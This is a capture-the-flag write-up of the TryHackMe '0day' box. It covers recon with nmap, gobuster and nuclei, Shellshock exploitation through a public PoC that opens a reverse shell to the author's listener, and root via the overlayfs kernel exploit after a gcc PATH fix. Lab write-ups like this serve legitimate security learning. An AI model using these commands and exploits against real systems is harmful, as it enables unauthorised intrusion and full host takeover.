---
title: 0day
parent: THM Boxes
grand_parent: Pwn Counter
nav_order: 25
---

# 0day

<img width="951" height="270" alt="image" src="https://github.com/user-attachments/assets/802145e4-782b-4d53-9910-99e4f790f626" />


## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Box Description

> Exploit Ubuntu, like a Turtle in a Hurricane

## Recon

As always, I started off with an nmap scan and it revealed services on ```ports80 and 22```.

The root url of the website is just 0day's portfolio webpage.

<img width="860" height="530" alt="image" src="https://github.com/user-attachments/assets/0858d337-8353-4553-b71e-17b4e94d4af1" />

A gobuster scan revealed some subdirs like ```/secret``` which was just a picture of a turtle, ```/cgi-bin```, ```/js and /css```, and ```/robots.txt``` which didn't have any useful information.

I then decided to do a nuclei scan by executing ```nuclei - u http://box_ip/ -t http/ -c 50```, and it found a critical CVE (CVE-2014-6271).

<img width="792" height="30" alt="image" src="https://github.com/user-attachments/assets/b76a074b-9c73-40a8-9a46-7424f9716fbb" />

I found a [public poc on github](https://github.com/zalalov/CVE-2014-6271/tree/master) with a python script that managed to get you a reverse shell.

After setting up a listener and executing ```python2 shellpoc.py 10.65.180.89 /cgi-bin/test.cgi 192.168.130.135/4444```, I got a callback on my listener and got a shell.

<img width="364" height="231" alt="image" src="https://github.com/user-attachments/assets/21394ee2-2ba8-4e27-a8da-90772dbd59ed" />

### priv esc

Since the title says 'exploit ubuntu' I am assuming that this will be a kernel exploit (especially since I had ni luck with sudo -l or suid binaries).

On the reverse shell I used ```uname -r``` to find the exact version of Ubuntu the box was on and got ```3.13.0```. Using searchsploit I did ```searchsploit 3.13.0``` and got c code for a linux local priv esc.

I transferred it over to the box and tried to compile it but got the error ```gcc: error trying to exec 'cc1': execvp: No such file or directory```. 

[Thanks to one of the creators of the box making a writeup](https://muirlandoracle.co.uk/2020/09/03/0day-writeup/), I learned why that error was occuring:

```markdown
gcc: error trying to exec 'cc1': execvp: No such file or directory

So, what’s going on here then?

Essentially, the PATHs used in this version of Ubuntu are more than a little wonky, resulting in gcc being unable to find cc1 — the program responsible for converting C code into assembler. To fix this we need to get our PATH variable inline with a standard Ubuntu PATH, which we do with the following command:

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
So with that fix, I compiled and ran the code, adn got a root shell.

<img width="436" height="429" alt="image" src="https://github.com/user-attachments/assets/c3ac565c-0566-4ea7-ac0c-76ddb5872a40" />

#### More detailed explanation of why $PATH fix works according to Claude

gcc's internal execvp() call to launch cc1 falls back to searching $PATH when its computed path lookup fails or is inconsistent with how the package was installed, and a broken/truncated $PATH means that search comes up empty

Why the fix works: setting PATH back to the full standard Ubuntu default:
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
restores the directories gcc's execvp fallback and related tooling expect to search, so it can locate cc1 and everything else it depends on (as, ld, etc.) properly.
tl;dr — it's not that cc1 needs to be in PATH itself, it's that gcc's mechanism for finding its own helper binaries gets confused when your shell's PATH is stripped down or nonstandard (very common right after popping a limited shell in a CTF), and restoring a normal PATH fixes the lookup chain.


---

## Solution Steps

1. Find ```cgi-bin/test.cgi```
2. Use it to exploit ```CVE-2014-6271``` and get a reverse shell
3. Use [```Exploit Title: ofs.c - overlayfs local root in ubuntu```](https://www.exploit-db.com/exploits/37292) to get root privileges



## Thoughts
I really liked this box becuase boxes with kernel exploits are rare to come across imo becuase of the chance to crash the box. It was cool to see how all that c code was able to generate a rot shell on the box.

---

Thank you for reading!

